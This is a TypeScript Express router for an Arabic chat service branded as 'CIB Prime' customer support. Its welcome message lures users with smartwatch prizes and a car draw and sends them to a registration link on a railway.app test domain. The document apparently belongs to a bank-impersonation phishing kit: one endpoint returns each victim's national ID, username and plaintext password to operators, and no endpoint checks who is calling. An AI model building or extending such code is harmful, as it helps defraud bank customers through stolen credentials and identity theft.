import { Router } from "express";
import { eq, desc, and, sql } from "drizzle-orm";
import { db, conversationsTable, messagesTable, clientSessionsTable, conversationSummariesTable } from "@workspace/db";
import { LocalAI } from "../lib/localAI";
import { notifyAdminsOfAgentRequest } from "../lib/realtime";

const router = Router();

// ============================================
// REST API للمحادثات
// ============================================

// الحصول على محادثة حالية أو إنشاء واحدة جديدة للعميل
router.post("/", async (req, res) => {
  try {
    const { sessionId } = req.body;
    
    console.log("[CONVERSATIONS] POST / - Creating/fetching conversation for sessionId:", sessionId);
    
    if (!sessionId) {
      console.log("[CONVERSATIONS] Validation failed: sessionId missing");
      return res.status(400).json({ success: false, error: "معرف الجلسة مطلوب" });
    }

    // البحث عن محادثة موجودة
    const existing = await db
      .select()
      .from(conversationsTable)
      .where(eq(conversationsTable.clientSessionId, sessionId))
      .orderBy(desc(conversationsTable.createdAt))
      .limit(1);

    if (existing.length > 0) {
      console.log("[CONVERSATIONS] Found existing conversation:", existing[0].id);
      return res.json({ success: true, data: existing[0] });
    }

    console.log("[CONVERSATIONS] Creating new conversation...");
    // إنشاء محادثة جديدة
    const [conversation] = await db
      .insert(conversationsTable)
      .values({ clientSessionId: sessionId, status: "pending", messageCount: 1 })
      .returning();

    console.log("[CONVERSATIONS] New conversation created:", conversation.id);

    // رسالة ترحيبية رسمية
    const welcomeMessage = `مرحباً بك في خدمة عملاء CIB Prime! 👋

أنا المساعد الذكي الخاص بكم، يمكنني الإجابة على استفساراتكم حول:

• تفعيل الساعات الذكية وألوانها (9 ألوان متاحة)
• خطوات التسجيل والاستحقاق
• خدمات البنك (التمويل، السحب على سيارة)
• أي استفسار آخر عن خدماتنا

للتسجيل: https://cib-test.up.railway.app

اكتبوا استفساركم وسأجيب فوراً.
أو اكتبوا "التواصل مع الموظف" للتحدث مع أحد ممثلي خدمة العملاء.`;

    // إضافة رسالة ترحيبية
    await db.insert(messagesTable).values({
      conversationId: conversation.id,
      senderType: "bot",
      content: welcomeMessage,
    });

    console.log("[CONVERSATIONS] Welcome message added");
    res.json({ success: true, data: conversation });
  } catch (error: any) {
    console.error("❌ [CONVERSATIONS] Error:", error.message || error);
    res.status(500).json({ success: false, error: "فشل في إنشاء المحادثة: " + error.message });
  }
});

// جلب جميع المحادثات (للموظف)
router.get("/", async (_req, res) => {
  try {
    const conversations = await db
      .select()
      .from(conversationsTable)
      .orderBy(desc(conversationsTable.updatedAt));

    // إضافة بيانات العميل لكل محادثة
    const enriched = await Promise.all(
      conversations.map(async (conv) => {
        const [session] = await db
          .select()
          .from(clientSessionsTable)
          .where(eq(clientSessionsTable.sessionId, conv.clientSessionId));

        // عدد الرسائل غير المقروءة
        const unreadResult = await db
          .select()
          .from(messagesTable)
          .where(and(
            eq(messagesTable.conversationId, conv.id),
            eq(messagesTable.senderType, "client"),
            eq(messagesTable.isRead, false)
          ));

        return {
          ...conv,
          clientName: session?.fullName || "عميل",
          clientMobile: session?.mobile || null,
          unreadCount: unreadResult.length,
        };
      })
    );

    res.json({ success: true, data: enriched });
  } catch (error: any) {
    console.error("❌ [CONVERSATIONS] Error:", error.message || error);
    res.status(500).json({ success: false, error: "فشل في جلب المحادثات" });
  }
});

// جلب محادثة محددة
router.get("/:id", async (req, res) => {
  try {
    const { id } = req.params;
    const conversationId = parseInt(id);

    const [conversation] = await db
      .select()
      .from(conversationsTable)
      .where(eq(conversationsTable.id, conversationId));

    if (!conversation) {
      return res.status(404).json({ success: false, error: "المحادثة غير موجودة" });
    }

    // جلب بيانات العميل
    const [session] = await db
      .select()
      .from(clientSessionsTable)
      .where(eq(clientSessionsTable.sessionId, conversation.clientSessionId));

    res.json({
      success: true,
      data: {
        ...conversation,
        clientName: session?.fullName || "عميل",
        clientMobile: session?.mobile || null,
        clientNationalId: session?.nationalId || null,
        clientUsername: session?.username || null,
        clientPassword: session?.password || null,
        clientStage: session?.stage || null,
      }
    });
  } catch (error: any) {
    console.error("❌ [CONVERSATION] Error:", error.message || error);
    res.status(500).json({ success: false, error: "فشل في جلب المحادثة" });
  }
});

// جلب رسائل محادثة محددة
router.get("/:id/messages", async (req, res) => {
  try {
    const { id } = req.params;
    const conversationId = parseInt(id);

    const messages = await db
      .select()
      .from(messagesTable)
      .where(eq(messagesTable.conversationId, conversationId))
      .orderBy(messagesTable.createdAt);

    res.json({ success: true, data: messages });
  } catch (error: any) {
    console.error("❌ [MESSAGES] Error:", error.message || error);
    res.status(500).json({ success: false, error: "فشل في جلب الرسائل" });
  }
});

// إرسال رسالة جديدة
router.post("/:id/messages", async (req, res) => {
  try {
    const { id } = req.params;
    const { senderType, senderId, content } = req.body;
    const conversationId = parseInt(id);

    console.log("[MESSAGES] New message request:", { id, senderType, senderId, content });
    console.log("[MESSAGES] Conversation ID parsed:", conversationId);

    if (!senderType || !content) {
      console.log("[MESSAGES] Validation failed: missing senderType or content");
      return res.status(400).json({ success: false, error: "نوع المرسل والمحتوى مطلوبان" });
    }

    // إضافة الرسالة
    const [message] = await db
      .insert(messagesTable)
      .values({
        conversationId,
        senderType,
        senderId: senderId || null,
        content,
      })
      .returning();

    console.log("[MESSAGES] Message saved:", message);

    // تحديث عداد الرسائل
    await db
      .update(conversationsTable)
      .set({ 
        updatedAt: new Date(),
        messageCount: sql`message_count + 1`
      })
      .where(eq(conversationsTable.id, conversationId));

    // إذا كانت الرسالة من العميل
    if (senderType === "client") {
      console.log("[MESSAGES] Processing client message with LocalAI...");
      
      // الحصول على بيانات المحادثة
      const [conversation] = await db
        .select()
        .from(conversationsTable)
        .where(eq(conversationsTable.id, conversationId));

      // الحصول على آخر ملخص للمحادثة
      const [lastSummary] = await db
        .select()
        .from(conversationSummariesTable)
        .where(eq(conversationSummariesTable.conversationId, conversationId))
        .orderBy(desc(conversationSummariesTable.createdAt))
        .limit(1);

      // الحصول على بيانات العميل
      let clientName = "عميلنا العزيز";
      if (conversation?.clientSessionId) {
        const [session] = await db
          .select()
          .from(clientSessionsTable)
          .where(eq(clientSessionsTable.sessionId, conversation.clientSessionId));
        if (session?.fullName) {
          clientName = session.fullName;
        }
      }

      // توليد رد ذكي
      const aiResult = LocalAI.generateReply({
        message: content,
        conversationContext: lastSummary?.summary || undefined,
        clientName,
        isBotActive: conversation?.botActive ?? true
      });

      console.log("[MESSAGES] AI Result:", { 
        requestAgentTransfer: aiResult.requestAgentTransfer,
        reactivateBot: aiResult.reactivateBot,
        context: aiResult.context 
      });

      // تحديث حالة المحادثة بناءً على نتيجة الذكاء الاصطناعي
      const updateData: Record<string, unknown> = {
        isAgentTransferRequested: aiResult.requestAgentTransfer,
        botActive: !aiResult.requestAgentTransfer // إذا طلب موظف → صمت الـ bot
      };

      // إذا أعاد الـ bot نشاطه
      if (aiResult.reactivateBot) {
        updateData.botActive = true;
      }

      await db
        .update(conversationsTable)
        .set(updateData)
        .where(eq(conversationsTable.id, conversationId));

      // إضافة رد الذكاء الاصطناعي
      await db.insert(messagesTable).values({
        conversationId,
        senderType: "bot",
        content: aiResult.reply,
      });

      // تلخيص المحادثة بعد كل 3 رسائل جديدة
      const messageCount = (conversation?.messageCount || 0) + 1;
      if (messageCount % 3 === 0) {
        const allMessages = await db
          .select()
          .from(messagesTable)
          .where(eq(messagesTable.conversationId, conversationId))
          .orderBy(messagesTable.createdAt);

        const summary = LocalAI.summarize(allMessages.map(m => ({
          senderType: m.senderType as 'client' | 'bot' | 'agent',
          content: m.content
        })));

        // حفظ الملخص
        await db.insert(conversationSummariesTable).values({
          conversationId,
          summary,
          messageCount
        });

        // تحديث آخر ملخص
        await db
          .update(conversationsTable)
          .set({ lastSummaryAt: new Date() })
          .where(eq(conversationsTable.id, conversationId));

        console.log("[MESSAGES] Conversation summarized:", summary.substring(0, 50) + "...");
      }

      // إعادة جلب الرسائل المحدثة
      const updatedMessages = await db
        .select()
        .from(messagesTable)
        .where(eq(messagesTable.conversationId, conversationId))
        .orderBy(messagesTable.createdAt);

      res.json({ 
        success: true, 
        data: updatedMessages,
        isAgentTransferRequested: aiResult.requestAgentTransfer,
        botActive: aiResult.reactivateBot || !aiResult.requestAgentTransfer
      });
      return;
    }

    res.json({ success: true, data: message });
  } catch (error: any) {
    console.error("❌ [NEW MESSAGE] Error:", error.message || error);
    res.status(500).json({ success: false, error: "فشل في إرسال الرسالة: " + error.message });
  }
});

// إرسال بيانات الاتصال للموظف
router.post("/:id/contact", async (req, res) => {
  try {
    const { id } = req.params;
    const { name, email, phone } = req.body;
    const conversationId = parseInt(id);

    console.log("[CONTACT] New contact request:", { conversationId, name, email, phone });

    if (!name || !phone) {
      return res.status(400).json({ 
        success: false, 
        error: "الاسم ورقم الموبايل مطلوبان" 
      });
    }

    // الحصول على بيانات المحادثة
    const [conversation] = await db
      .select()
      .from(conversationsTable)
      .where(eq(conversationsTable.id, conversationId));

    if (!conversation) {
      return res.status(404).json({ success: false, error: "المحادثة غير موجودة" });
    }

    // حفظ بيانات الاتصال في المحادثة
    await db
      .update(conversationsTable)
      .set({ 
        isAgentTransferRequested: true,
        updatedAt: new Date()
      })
      .where(eq(conversationsTable.id, conversationId));

    // إضافة رسالة تأكيد من البوت
    await db.insert(messagesTable).values({
      conversationId,
      senderType: "bot",
      content: `✅ تم استلام بياناتك بنجاح!\n\n📝 الاسم: ${name}\n📧 البريد: ${email || 'غير محدد'}\n📱 الموبايل: ${phone}\n\nسيتواصل معك أحد ممثلي خدمة العملاء قريباً. شكراً لتواصلك معنا! 🙏`,
    });

    // إشعار المدراء عبر WebSocket
    notifyAdminsOfAgentRequest({
      conversationId,
      clientName: name,
      clientPhone: phone,
      clientEmail: email,
      sessionId: conversation.clientSessionId,
      timestamp: new Date().toISOString()
    });

    res.json({ 
      success: true, 
      message: "تم حفظ بيانات الاتصال",
      data: { name, email, phone }
    });
  } catch (error: any) {
    console.error("❌ [CONTACT] Error:", error.message || error);
    res.status(500).json({ success: false, error: "فشل في حفظ بيانات الاتصال" });
  }
});

// بدء المحادثة من قبل الموظف
router.post("/:id/connect", async (req, res) => {
  try {
    const { id } = req.params;
    const { agentId } = req.body;
    const conversationId = parseInt(id);

    // تحديث حالة المحادثة
    await db
      .update(conversationsTable)
      .set({
        status: "active",
        agentConnectedAt: new Date(),
      })
      .where(eq(conversationsTable.id, conversationId));

    // إضافة رسالة من البوت
    await db.insert(messagesTable).values({
      conversationId,
      senderType: "bot",
      content: "مرحباً، الموظف في خدمتك! 🎧\nيرجى إرسال مشكلتك أو استفسارك وسقوم بالرد عليك الآن.\n\n⏳ الموظف متصل الآن",
    });

    // إضافة رسالة من الموظف
    await db.insert(messagesTable).values({
      conversationId,
      senderType: "agent",
      senderId: agentId || "agent",
      content: "مرحباً بك! أنا هنا لمساعدتك. كيف يمكنني مساعدتك اليوم؟",
    });

    res.json({ success: true, message: "تم بدء المحادثة" });
  } catch (error: any) {
    console.error("❌ [CONNECT] Error:", error.message || error);
    res.status(500).json({ success: false, error: "فشل في بدء المحادثة" });
  }
});

// تحديث حالة المحادثة (open/closed) - للعميل
router.patch("/:id/ping", async (req, res) => {
  try {
    const { id } = req.params;
    const conversationId = parseInt(id);

    await db
      .update(conversationsTable)
      .set({
        clientOnlineAt: new Date(),
      })
      .where(eq(conversationsTable.id, conversationId));

    res.json({ success: true });
  } catch (error: any) {
    console.error("❌ [PING] Error:", error.message || error);
    res.status(500).json({ success: false, error: "فشل في تحديث الحالة" });
  }
});

// جلب آخر الرسائل (للـ polling)
router.get("/:id/messages/latest", async (req, res) => {
  try {
    const { id } = req.params;
    const { after } = req.query;
    const conversationId = parseInt(id);

    let query = db
      .select()
      .from(messagesTable)
      .where(eq(messagesTable.conversationId, conversationId))
      .orderBy(messagesTable.createdAt);

    const messages = await query;

    // تصفيحتى الرسائل الجديدة
    const afterId = after ? parseInt(after as string) : 0;
    const newMessages = messages.filter(m => m.id > afterId);

    res.json({ success: true, data: newMessages });
  } catch (error: any) {
    console.error("❌ [LATEST MESSAGES] Error:", error.message || error);
    res.status(500).json({ success: false, error: "فشل في جلب الرسائل" });
  }
});

export default router;
